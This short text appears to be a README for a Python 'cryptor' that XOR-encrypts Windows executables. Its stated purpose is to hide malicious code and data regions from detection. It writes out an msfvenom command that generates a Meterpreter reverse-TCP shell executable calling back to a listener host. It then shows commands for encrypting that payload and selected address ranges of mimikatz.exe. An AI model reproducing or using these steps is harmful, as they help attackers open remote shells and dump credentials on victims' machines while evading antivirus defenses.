Simple XOR with user supplied key.

## Automatic crypt

By default this tool try to encrypt everything besides of PE-structures.

`msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 EXITFUNC=thread -f exe -o meter.exe`

`./cryptor.py meter.exe`

Sometimes encrypted program may be corrupted. In this case it need to use manual encryption.

## Manual crypt

Here is we need to find malicious regions with code and data (with r2/hte/hiew32/etc).

`./cryptor.py mimikatz.exe --ranges 0x140001000,0xc0e00 0x140121000,0x6200 0x1400c33f0-0x140110e77 0x140128150,940`
